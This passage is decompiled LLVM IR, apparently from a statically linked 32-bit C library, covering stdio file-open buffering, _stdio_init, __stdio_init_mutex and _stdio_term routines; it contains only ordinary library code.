  store i32 %v2_804cc0c, i32* %eax.global-to-local, align 4
  store i32 %v2_804cc0c, i32* %stack_var_-76, align 4
  %v1_804cc10 = call i32 @__stdio_init_mutex(i32 %v2_804cc0c)
  store i32 %v1_804cc10, i32* %eax.global-to-local, align 4
  %v0_804cc65.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804cc18

dec_label_pc_804cc18:                             ; preds = %dec_label_pc_804cbe2, %dec_label_pc_804cbfd
  %v2_804cc6b = phi i32 [ %v0_804cc658, %dec_label_pc_804cbe2 ], [ %v0_804cc65.pre, %dec_label_pc_804cbfd ]
  %v2_804cc18 = icmp slt i32 %arg4, 0
  br i1 %v2_804cc18, label %dec_label_pc_804cc65, label %dec_label_pc_804cc1c

dec_label_pc_804cc1c:                             ; preds = %dec_label_pc_804cc18
  %v1_804cc1e = and i32 %v2_804cc6b, 32771
  %v1_804cc24 = add nuw nsw i32 %v1_804cc1e, 1
  store i32 %v1_804cc24, i32* @edx, align 4
  %v0_804cc25 = load i32, i32* @esi, align 4
  %v1_804cc25 = add i32 %v0_804cc25, 1
  %v2_804cc28 = and i32 %v1_804cc25, %v1_804cc24
  store i32 %v2_804cc28, i32* %eax.global-to-local, align 4
  %v12_804cc2a = icmp eq i32 %v2_804cc28, %v1_804cc24
  %v1_804cc2c = load i32, i32* @ebp, align 4
  %v2_804cc2c = add i32 %v1_804cc2c, 4
  %v3_804cc2c = inttoptr i32 %v2_804cc2c to i32*
  store i32 %arg4, i32* %v3_804cc2c, align 4
  %v1_804cc2f = icmp eq i1 %v12_804cc2a, false
  br i1 %v1_804cc2f, label %dec_label_pc_804cb9a, label %dec_label_pc_804cc35

dec_label_pc_804cc35:                             ; preds = %dec_label_pc_804cc1c
  %v0_804cc35 = load i32, i32* @esi, align 4
  %v1_804cc37 = and i32 %v0_804cc35, 1024
  %v1_804cc39 = xor i32 %v1_804cc37, 1024
  store i32 %v1_804cc39, i32* %eax.global-to-local, align 4
  %v1_804cc3e = load i32, i32* @ebx, align 4
  %v2_804cc3e = and i32 %v1_804cc3e, %v1_804cc39
  %v3_804cc3e = icmp eq i32 %v2_804cc3e, 0
  br i1 %v3_804cc3e, label %dec_label_pc_804cc35.dec_label_pc_804cc5b_crit_edge, label %dec_label_pc_804cc42

dec_label_pc_804cc35.dec_label_pc_804cc5b_crit_edge: ; preds = %dec_label_pc_804cc35
  br label %dec_label_pc_804cc5b

dec_label_pc_804cc42:                             ; preds = %dec_label_pc_804cc35
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_804cc4b = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_804cc4b, i32* %eax.global-to-local, align 4
  %v1_804cc53 = icmp eq i32 %v3_804cc4b, 0
  %v1_804cc55 = icmp eq i1 %v1_804cc53, false
  br i1 %v1_804cc55, label %dec_label_pc_804cb9a, label %dec_label_pc_804cc42.dec_label_pc_804cc5b_crit_edge

dec_label_pc_804cc42.dec_label_pc_804cc5b_crit_edge: ; preds = %dec_label_pc_804cc42
  %v0_804cc5b.pre = load i32, i32* @esi, align 4
  %v0_804cc61.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804cc5b

dec_label_pc_804cc5b:                             ; preds = %dec_label_pc_804cc35.dec_label_pc_804cc5b_crit_edge, %dec_label_pc_804cc42.dec_label_pc_804cc5b_crit_edge
  %v0_804cc61 = phi i32 [ %v1_804cc3e, %dec_label_pc_804cc35.dec_label_pc_804cc5b_crit_edge ], [ %v0_804cc61.pre, %dec_label_pc_804cc42.dec_label_pc_804cc5b_crit_edge ]
  %v0_804cc5b = phi i32 [ %v0_804cc35, %dec_label_pc_804cc35.dec_label_pc_804cc5b_crit_edge ], [ %v0_804cc5b.pre, %dec_label_pc_804cc42.dec_label_pc_804cc5b_crit_edge ]
  %v1_804cc5b = and i32 %v0_804cc5b, 32768
  %v2_804cc61 = or i32 %v1_804cc5b, %v0_804cc61
  store i32 %v2_804cc61, i32* @ebx, align 4
  br label %dec_label_pc_804cc89

dec_label_pc_804cc65:                             ; preds = %dec_label_pc_804cc18
  %v11_804cc67 = or i32 %v2_804cc6b, 32768
  store i32 %v11_804cc67, i32* %eax.global-to-local, align 4
  %v1_804cc6a = add i32 %arg4, 1
  %v8_804cc6a = icmp eq i32 %v1_804cc6a, 0
  store i32 %v1_804cc6a, i32* @edi, align 4
  %v1_804cc6b = icmp eq i1 %v8_804cc6a, false
  %v4_804cc6b = select i1 %v1_804cc6b, i32 %v11_804cc67, i32 %v2_804cc6b
  store i32 %v4_804cc6b, i32* @ebx, align 4
  %v0_804cc75 = load i32, i32* @esi, align 4
  store i32 %v0_804cc75, i32* %stack_var_-76, align 4
  %v3_804cc76 = inttoptr i32 %v0_804cc75 to i8*
  %v4_804cc76 = call i32 @__libc_open(i8* %v3_804cc76, i32 %v4_804cc6b, i32 438)
  store i32 %v4_804cc76, i32* %eax.global-to-local, align 4
  %v2_804cc7e = icmp slt i32 %v4_804cc76, 0
  %v1_804cc80 = load i32, i32* @ebp, align 4
  %v2_804cc80 = add i32 %v1_804cc80, 4
  %v3_804cc80 = inttoptr i32 %v2_804cc80 to i32*
  store i32 %v4_804cc76, i32* %v3_804cc80, align 4
  br i1 %v2_804cc7e, label %dec_label_pc_804cbad, label %dec_label_pc_804cc89

dec_label_pc_804cc89:                             ; preds = %dec_label_pc_804cc65, %dec_label_pc_804cc5b
  %v0_804cc89 = load i32, i32* @ebp, align 4
  %v1_804cc89 = inttoptr i32 %v0_804cc89 to i32*
  %v2_804cc89 = load i32, i32* %v1_804cc89, align 4
  %v2_804cc89.tr = trunc i32 %v2_804cc89 to i16
  %v1_804cc91 = and i16 %v2_804cc89.tr, 8192
  %v3_804cc91 = inttoptr i32 %v0_804cc89 to i16*
  store i16 %v1_804cc91, i16* %v3_804cc91, align 2
  %v0_804cc95 = load i32, i32* @ebx, align 4
  store i32 %v0_804cc95, i32* %eax.global-to-local, align 4
  %v1_804cc97 = and i32 %v0_804cc95, -31744
  %v0_804cc9d = load i32, i32* @ebp, align 4
  %v1_804cc9d = inttoptr i32 %v0_804cc9d to i32*
  %v2_804cc9d = load i32, i32* %v1_804cc9d, align 4
  %v1_804cca0 = mul i32 %v0_804cc95, 16
  %v1_804cca3 = and i32 %v1_804cca0, 48
  %v1_804cca4 = add nuw nsw i32 %v1_804cca3, 16
  %v2_804cca7 = xor i32 %v1_804cca4, 48
  %v2_804ccaa = or i32 %v2_804cc9d, %v1_804cc97
  %v2_804ccac = or i32 %v2_804ccaa, %v2_804cca7
  store i32 %v2_804ccac, i32* %eax.global-to-local, align 4
  %v1_804ccae = trunc i32 %v2_804ccac to i16
  %v3_804ccae = inttoptr i32 %v0_804cc9d to i16*
  store i16 %v1_804ccae, i16* %v3_804ccae, align 2
  %v0_804ccb2 = load i32, i32* %stack_var_-76, align 4
  %v1_804ccb2 = call i32 @__errno_location(i32 %v0_804ccb2)
  store i32 %v1_804ccb2, i32* %eax.global-to-local, align 4
  %v0_804ccba = load i32, i32* @ebp, align 4
  %v1_804ccba = inttoptr i32 %v0_804ccba to i16*
  %v2_804ccba = load i16, i16* %v1_804ccba, align 2
  %v3_804ccba = zext i16 %v2_804ccba to i32
  store i32 %v3_804ccba, i32* @ebx, align 4
  %v1_804ccbe = inttoptr i32 %v1_804ccb2 to i32*
  %v2_804ccbe = load i32, i32* %v1_804ccbe, align 4
  store i32 %v2_804ccbe, i32* @edi, align 4
  store i32 %v1_804ccb2, i32* @esi, align 4
  %v1_804ccc2 = add i32 %v0_804ccba, 4
  %v2_804ccc2 = inttoptr i32 %v1_804ccc2 to i32*
  %v3_804ccc2 = load i32, i32* %v2_804ccc2, align 4
  store i32 %v3_804ccc2, i32* %stack_var_-76, align 4
  %v1_804ccc5 = call i32 @isatty(i32 %v3_804ccc2)
  %v2_804cccd = mul i32 %v1_804ccc5, 256
  store i32 %v2_804cccd, i32* %eax.global-to-local, align 4
  %v0_804ccd0 = load i32, i32* @ebx, align 4
  %v2_804ccd0 = or i32 %v0_804ccd0, %v2_804cccd
  store i32 %v2_804ccd0, i32* @ebx, align 4
  %v1_804ccd2 = trunc i32 %v2_804ccd0 to i16
  %v2_804ccd2 = load i32, i32* @ebp, align 4
  %v3_804ccd2 = inttoptr i32 %v2_804ccd2 to i16*
  store i16 %v1_804ccd2, i16* %v3_804ccd2, align 2
  %v0_804ccd6 = load i32, i32* @edi, align 4
  %v1_804ccd6 = load i32, i32* @esi, align 4
  %v2_804ccd6 = inttoptr i32 %v1_804ccd6 to i32*
  store i32 %v0_804ccd6, i32* %v2_804ccd6, align 4
  %v0_804ccd8 = load i32, i32* @ebp, align 4
  %v1_804ccd8 = add i32 %v0_804ccd8, 8
  %v2_804ccd8 = inttoptr i32 %v1_804ccd8 to i32*
  %v3_804ccd8 = load i32, i32* %v2_804ccd8, align 4
  %v4_804ccd8 = icmp eq i32 %v3_804ccd8, 0
  %v1_804ccdc = icmp eq i1 %v4_804ccd8, false
  br i1 %v1_804ccdc, label %dec_label_pc_804cd10, label %dec_label_pc_804ccde

dec_label_pc_804ccde:                             ; preds = %dec_label_pc_804cc89
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804cce6 = call i32 @malloc(i32 4096)
  store i32 %v1_804cce6, i32* %eax.global-to-local, align 4
  %v1_804ccee = icmp eq i32 %v1_804cce6, 0
  %v1_804ccf0 = load i32, i32* @ebp, align 4
  %v2_804ccf0 = add i32 %v1_804ccf0, 8
  %v3_804ccf0 = inttoptr i32 %v2_804ccf0 to i32*
  store i32 %v1_804cce6, i32* %v3_804ccf0, align 4
  br i1 %v1_804ccee, label %dec_label_pc_804cd09, label %dec_label_pc_804ccf5

dec_label_pc_804ccf5:                             ; preds = %dec_label_pc_804ccde
  %v1_804ccf5 = add i32 %v1_804cce6, 4096
  store i32 %v1_804ccf5, i32* %eax.global-to-local, align 4
  %v1_804ccfa = load i32, i32* @ebp, align 4
  %v2_804ccfa = add i32 %v1_804ccfa, 12
  %v3_804ccfa = inttoptr i32 %v2_804ccfa to i32*
  store i32 %v1_804ccf5, i32* %v3_804ccfa, align 4
  %v0_804ccfd = load i32, i32* @ebp, align 4
  %v1_804ccfd = inttoptr i32 %v0_804ccfd to i32*
  %v2_804ccfd = load i32, i32* %v1_804ccfd, align 4
  %v1_804cd00 = udiv i32 %v2_804ccfd, 256
  %v3_804cd00 = and i32 %v1_804cd00, 191
  %v8_804cd00 = or i32 %v3_804cd00, 64
  %v10_804cd00 = mul nuw nsw i32 %v8_804cd00, 256
  %v11_804cd00 = and i32 %v2_804ccfd, -65281
  %v12_804cd00 = or i32 %v10_804cd00, %v11_804cd00
  store i32 %v12_804cd00, i32* %eax.global-to-local, align 4
  %v1_804cd03 = trunc i32 %v12_804cd00 to i16
  %v3_804cd03 = inttoptr i32 %v0_804ccfd to i16*
  store i16 %v1_804cd03, i16* %v3_804cd03, align 2
  br label %dec_label_pc_804cd10

dec_label_pc_804cd09:                             ; preds = %dec_label_pc_804ccde
  %v0_804cd09 = load i32, i32* @ebp, align 4
  %v1_804cd09 = add i32 %v0_804cd09, 12
  %v2_804cd09 = inttoptr i32 %v1_804cd09 to i32*
  store i32 0, i32* %v2_804cd09, align 4
  br label %dec_label_pc_804cd10

dec_label_pc_804cd10:                             ; preds = %dec_label_pc_804cc89, %dec_label_pc_804ccf5, %dec_label_pc_804cd09
  %v0_804cd10 = load i32, i32* @ebp, align 4
  %v1_804cd10 = add i32 %v0_804cd10, 8
  %v2_804cd10 = inttoptr i32 %v1_804cd10 to i32*
  %v3_804cd10 = load i32, i32* %v2_804cd10, align 4
  store i32 %v3_804cd10, i32* %eax.global-to-local, align 4
  %v1_804cd13 = add i32 %v0_804cd10, 2
  %v2_804cd13 = inttoptr i32 %v1_804cd13 to i8*
  store i8 0, i8* %v2_804cd13, align 1
  %v0_804cd17 = load i32, i32* @ebp, align 4
  %v1_804cd17 = add i32 %v0_804cd17, 44
  %v2_804cd17 = inttoptr i32 %v1_804cd17 to i32*
  store i32 0, i32* %v2_804cd17, align 4
  %v0_804cd1e = load i32, i32* @ebp, align 4
  %v1_804cd1e = add i32 %v0_804cd1e, 1
  %v2_804cd1e = inttoptr i32 %v1_804cd1e to i8*
  %v3_804cd1e = load i8, i8* %v2_804cd1e, align 1
  %v4_804cd1e = and i8 %v3_804cd1e, 32
  %v5_804cd1e = icmp eq i8 %v4_804cd1e, 0
  %v0_804cd22 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cd22 = add i32 %v0_804cd1e, 24
  %v3_804cd22 = inttoptr i32 %v2_804cd22 to i32*
  store i32 %v0_804cd22, i32* %v3_804cd22, align 4
  %v0_804cd25 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd25 = load i32, i32* @ebp, align 4
  %v2_804cd25 = add i32 %v1_804cd25, 28
  %v3_804cd25 = inttoptr i32 %v2_804cd25 to i32*
  store i32 %v0_804cd25, i32* %v3_804cd25, align 4
  %v0_804cd28 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd28 = load i32, i32* @ebp, align 4
  %v2_804cd28 = add i32 %v1_804cd28, 16
  %v3_804cd28 = inttoptr i32 %v2_804cd28 to i32*
  store i32 %v0_804cd28, i32* %v3_804cd28, align 4
  %v0_804cd2b = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd2b = load i32, i32* @ebp, align 4
  %v2_804cd2b = add i32 %v1_804cd2b, 20
  %v3_804cd2b = inttoptr i32 %v2_804cd2b to i32*
  store i32 %v0_804cd2b, i32* %v3_804cd2b, align 4
  %v0_804cd2e = load i32, i32* @global_var_80521c0.101, align 64
  store i32 %v0_804cd2e, i32* @eax, align 4
  %v1_804cd33 = load i32, i32* @ebp, align 4
  %v2_804cd33 = add i32 %v1_804cd33, 52
  %v3_804cd33 = inttoptr i32 %v2_804cd33 to i32*
  store i32 %v0_804cd2e, i32* %v3_804cd33, align 4
  br i1 %v5_804cd1e, label %dec_label_pc_804cda5, label %dec_label_pc_804cd38

dec_label_pc_804cd38:                             ; preds = %dec_label_pc_804cd10
  %v2_804cd43 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804cd43, i32* %stack_var_-76, align 4
  %v2_804cd48 = call i32 @__pthread_return_void(i32 %v2_804cd43, i32 134526871)
  store i32 %v2_804cd48, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* %stack_var_-76, align 4
  %v1_804cd54 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 %v1_804cd54, i32* @eax, align 4
  %v2_804cd66 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804cd66, i32* %stack_var_-76, align 4
  %v2_804cd6b = call i32 @__pthread_return_void(i32 %v2_804cd66, i32 134526871)
  store i32 %v2_804cd6b, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8052190.102 to i32), i32* %stack_var_-76, align 4
  %v1_804cd77 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  %v0_804cd7c = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v0_804cd7c, i32* @eax, align 4
  %v1_804cd81 = load i32, i32* @ebp, align 4
  %v2_804cd81 = add i32 %v1_804cd81, 32
  %v3_804cd81 = inttoptr i32 %v2_804cd81 to i32*
  store i32 %v0_804cd7c, i32* %v3_804cd81, align 4
  %v2_804cd84 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804cd84, i32* @ecx, align 4
  %v0_804cd85 = load i32, i32* @ebp, align 4
  store i32 %v0_804cd85, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v2_804cd66, i32* %stack_var_-76, align 4
  %v2_804cd8f = call i32 @__pthread_return_void(i32 %v2_804cd66, i32 1)
  store i32 %v2_804cd66, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804cd43, i32* %stack_var_-76, align 4
  %v2_804cd99 = call i32 @__pthread_return_void(i32 %v2_804cd43, i32 1)
  br label %dec_label_pc_804cd9e

dec_label_pc_804cd9e:                             ; preds = %dec_label_pc_804cbb7, %dec_label_pc_804cd38
  %storemerge = phi i32 [ %v2_804cd99, %dec_label_pc_804cd38 ], [ %v1_804cbbd, %dec_label_pc_804cbb7 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cda5

dec_label_pc_804cda3:                             ; preds = %dec_label_pc_804cbad, %dec_label_pc_804cb9a
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804cda5

dec_label_pc_804cda5:                             ; preds = %dec_label_pc_804cd10, %dec_label_pc_804cbe6, %dec_label_pc_804cd9e, %dec_label_pc_804cda3
  %v0_804cda8 = load i32, i32* @ebp, align 4
  store i32 %v0_804cda8, i32* %eax.global-to-local, align 4
  %v2_804cdaa = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cdaa, i32* @ebx, align 4
  store i32 %v0_804cb6e, i32* @esi, align 4
  store i32 %v0_804cb6d, i32* @edi, align 4
  store i32 %v0_804cb6c, i32* @ebp, align 4
  ret i32 %v0_804cda8

; uselistorder directives
  uselistorder i32 %v2_804cd66, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804cd43, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804ccfd, { 1, 0 }
  uselistorder i32 %v1_804cce6, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804cccd, { 1, 0 }
  uselistorder i32 %v1_804ccb2, { 1, 0, 2 }
  uselistorder i32 %v11_804cc67, { 1, 0 }
  uselistorder i32 %v1_804cc39, { 1, 0 }
  uselistorder i32 %v0_804cc35, { 1, 0 }
  uselistorder i32 %v2_804cc6b, { 1, 0, 2 }
  uselistorder i32 %v1_804cbeb, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 26, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 27, 24, 25 }
  uselistorder i32 -65281, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__libc_open, { 1, 0, 2 }
  uselistorder i32 32768, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_804cda5, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804cd9e, { 1, 0 }
  uselistorder label %dec_label_pc_804cd10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804cc5b, { 1, 0 }
  uselistorder label %dec_label_pc_804cc18, { 1, 0 }
  uselistorder label %dec_label_pc_804cbe2, { 1, 0 }
  uselistorder label %dec_label_pc_804cbc9, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804cdb1 = load i32, i32* @edi, align 4
  %v0_804cdb2 = load i32, i32* @esi, align 4
  %v0_804cdb3 = load i32, i32* @ebx, align 4
  store i32 %v0_804cdb3, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804cdbc = call i32 @__errno_location(i32 %v0_804cdb3)
  %v0_804cdc4 = load i16, i16* @global_var_80521e0.103, align 32
  %v1_804cdc4 = zext i16 %v0_804cdc4 to i32
  store i32 %v1_804cdc4, i32* @esi, align 4
  %v1_804cdcb = inttoptr i32 %v1_804cdbc to i32*
  %v2_804cdcb = load i32, i32* %v1_804cdcb, align 4
  store i32 %v2_804cdcb, i32* %ebp.global-to-local, align 4
  store i32 %v1_804cdbc, i32* @edi, align 4
  %v1_804cdd1 = call i32 @isatty(i32 0)
  %v0_804cdd6 = load i32, i32* @ebx, align 4
  %v2_804cddf = sub i32 %v0_804cdd6, %v1_804cdd1
  %v2_804cde3 = mul i32 %v2_804cddf, 256
  %v0_804cde6 = load i32, i32* @esi, align 4
  %v2_804cde6 = xor i32 %v0_804cde6, %v2_804cde3
  %v1_804cde8 = trunc i32 %v2_804cde6 to i16
  store i16 %v1_804cde8, i16* @global_var_80521e0.103, align 32
  %v0_804cdef = load i16, i16* @global_var_8052230.105, align 16
  %v1_804cdef = zext i16 %v0_804cdef to i32
  store i32 %v1_804cdef, i32* @esi, align 4
  %v1_804cdf6 = call i32 @isatty(i32 1)
  %v0_804cdfb = load i32, i32* @ebx, align 4
  %v2_804cdfb = sub i32 %v0_804cdfb, %v1_804cdf6
  %v2_804cdfd = mul i32 %v2_804cdfb, 256
  %v0_804ce00 = load i32, i32* @esi, align 4
  %v2_804ce00 = xor i32 %v2_804cdfd, %v0_804ce00
  %v1_804ce02 = trunc i32 %v2_804ce00 to i16
  store i16 %v1_804ce02, i16* @global_var_8052230.105, align 16
  %v0_804ce09 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ce09 = load i32, i32* @edi, align 4
  %v2_804ce09 = inttoptr i32 %v1_804ce09 to i32*
  store i32 %v0_804ce09, i32* %v2_804ce09, align 4
  %v2_804ce0e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ce0e, i32* @ebx, align 4
  store i32 %v0_804cdb2, i32* @esi, align 4
  store i32 %v0_804cdb1, i32* @edi, align 4
  ret i32 %v1_804cdf6

; uselistorder directives
  uselistorder i32 %v1_804cdbc, { 1, 0 }
  uselistorder i16* @global_var_8052230.105, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804ce21 = inttoptr i32 %arg1 to i16*
  %v4_804ce21 = call i32 @memcpy(i16* %v3_804ce21, i32 ptrtoint (i32* @global_var_8050830.106 to i32), i32 24)
  ret i32 %v4_804ce21
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ce2a = load i32, i32* @esi, align 4
  %v0_804ce2b = load i32, i32* @ebx, align 4
  store i32 %v0_804ce2b, i32* %stack_var_-8, align 4
  %v1_804ce34 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  store i32 %v1_804ce34, i32* %eax.global-to-local, align 4
  %v1_804ce40 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 %v1_804ce40, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804ce8a22 = icmp eq i32 %storemerge21, 0
  %v1_804ce8c24 = icmp eq i1 %v1_804ce8a22, false
  br i1 %v1_804ce8c24, label %dec_label_pc_804ce4d.lr.ph, label %dec_label_pc_804ceaa.preheader

dec_label_pc_804ce4d.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804ce4d

dec_label_pc_804ce4d:                             ; preds = %dec_label_pc_804ce4d.lr.ph, %dec_label_pc_804ce74
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_804ce4d.lr.ph ], [ %storemerge, %dec_label_pc_804ce74 ]
  %v1_804ce50 = add i32 %storemerge25, 56
  store i32 %v1_804ce50, i32* @esi, align 4
  %v1_804ce54 = call i32 @__pthread_return_0(i32 %v1_804ce50)
  store i32 %v1_804ce54, i32* %eax.global-to-local, align 4
  %v1_804ce5c = icmp eq i32 %v1_804ce54, 0
  br i1 %v1_804ce5c, label %dec_label_pc_804ce74, label %dec_label_pc_804ce60

dec_label_pc_804ce60:                             ; preds = %dec_label_pc_804ce4d
  %v0_804ce60 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce60 = add i32 %v0_804ce60, 8
  %v2_804ce60 = inttoptr i32 %v1_804ce60 to i32*
  %v3_804ce60 = load i32, i32* %v2_804ce60, align 4
  store i32 %v3_804ce60, i32* %eax.global-to-local, align 4
  %v1_804ce63 = inttoptr i32 %v0_804ce60 to i16*
  store i16 48, i16* %v1_804ce63, align 2
  %v0_804ce68 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ce68 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ce68 = add i32 %v1_804ce68, 24
  %v3_804ce68 = inttoptr i32 %v2_804ce68 to i32*
  store i32 %v0_804ce68, i32* %v3_804ce68, align 4
  %v0_804ce6b = load i32, i32* %eax.global-to-local, align 4
  %v1_804ce6b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ce6b = add i32 %v1_804ce6b, 28
  %v3_804ce6b = inttoptr i32 %v2_804ce6b to i32*
  store i32 %v0_804ce6b, i32* %v3_804ce6b, align 4
  %v0_804ce6e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ce6e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ce6e = add i32 %v1_804ce6e, 16
  %v3_804ce6e = inttoptr i32 %v2_804ce6e to i32*
  store i32 %v0_804ce6e, i32* %v3_804ce6e, align 4
  %v0_804ce71 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ce71 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ce71 = add i32 %v1_804ce71, 20
  %v3_804ce71 = inttoptr i32 %v2_804ce71 to i32*
  store i32 %v0_804ce71, i32* %v3_804ce71, align 4
  br label %dec_label_pc_804ce74

dec_label_pc_804ce74:                             ; preds = %dec_label_pc_804ce4d, %dec_label_pc_804ce60
  %v0_804ce77 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce77 = add i32 %v0_804ce77, 52
  %v2_804ce77 = inttoptr i32 %v1_804ce77 to i32*
  store i32 1, i32* %v2_804ce77, align 4
  %v0_804ce7e = load i32, i32* @esi, align 4
  %v1_804ce7f = call i32 @__stdio_init_mutex(i32 %v0_804ce7e)
  store i32 %v1_804ce7f, i32* %eax.global-to-local, align 4
  %v0_804ce84 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce84 = add i32 %v0_804ce84, 32
  %v2_804ce84 = inttoptr i32 %v1_804ce84 to i32*
  %storemerge = load i32, i32* %v2_804ce84, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804ce8a = icmp eq i32 %storemerge, 0
  %v1_804ce8c = icmp eq i1 %v1_804ce8a, false
  br i1 %v1_804ce8c, label %dec_label_pc_804ce4d, label %dec_label_pc_804ce87.dec_label_pc_804ceaa.preheader_crit_edge

dec_label_pc_804ce87.dec_label_pc_804ceaa.preheader_crit_edge: ; preds = %dec_label_pc_804ce74
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  br label %dec_label_pc_804ceaa.preheader

dec_label_pc_804ceaa.preheader:                   ; preds = %dec_label_pc_804ce87.dec_label_pc_804ceaa.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804ce87.dec_label_pc_804ceaa.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804ceaa3 = icmp eq i32 %storemerge12, 0
  %v1_804ceac10 = icmp eq i1 %v1_804ceaa3, false
  br i1 %v1_804ceac10, label %dec_label_pc_804ce96.preheader, label %dec_label_pc_804ceae

dec_label_pc_804ce96.preheader:                   ; preds = %dec_label_pc_804ceaa.preheader
  br label %dec_label_pc_804ce96

dec_label_pc_804ce96:                             ; preds = %dec_label_pc_804ce96.preheader, %dec_label_pc_804cea7
  %v0_804ce9e = phi i32 [ %storemerge1, %dec_label_pc_804cea7 ], [ %storemerge12, %dec_label_pc_804ce96.preheader ]
  %v1_804ce96 = inttoptr i32 %v0_804ce9e to i8*
  %v2_804ce96 = load i8, i8* %v1_804ce96, align 1
  %v3_804ce96 = and i8 %v2_804ce96, 64
  %v4_804ce96 = icmp eq i8 %v3_804ce96, 0
  br i1 %v4_804ce96, label %dec_label_pc_804cea7, label %dec_label_pc_804ce9b

dec_label_pc_804ce9b:                             ; preds = %dec_label_pc_804ce96
  %v1_804ce9f = call i32 @__stdio_wcommit(i32 %v0_804ce9e)
  store i32 %v1_804ce9f, i32* %eax.global-to-local, align 4
  %v0_804cea7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804cea7

dec_label_pc_804cea7:                             ; preds = %dec_label_pc_804ce96, %dec_label_pc_804ce9b
  %v0_804cea7 = phi i32 [ %v0_804ce9e, %dec_label_pc_804ce96 ], [ %v0_804cea7.pre, %dec_label_pc_804ce9b ]
  %v1_804cea7 = add i32 %v0_804cea7, 32
  %v2_804cea7 = inttoptr i32 %v1_804cea7 to i32*
  %storemerge1 = load i32, i32* %v2_804cea7, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804ceaa = icmp eq i32 %storemerge1, 0
  %v1_804ceac = icmp eq i1 %v1_804ceaa, false
  br i1 %v1_804ceac, label %dec_label_pc_804ce96, label %dec_label_pc_804ceae

dec_label_pc_804ceae:                             ; preds = %dec_label_pc_804cea7, %dec_label_pc_804ceaa.preheader
  %v2_804ceae = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ceae, i32* %eax.global-to-local, align 4
  %v2_804ceaf = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ceaf, i32* @ebx, align 4
  store i32 %v0_804ce2a, i32* @esi, align 4
  ret i32 %v2_804ceae

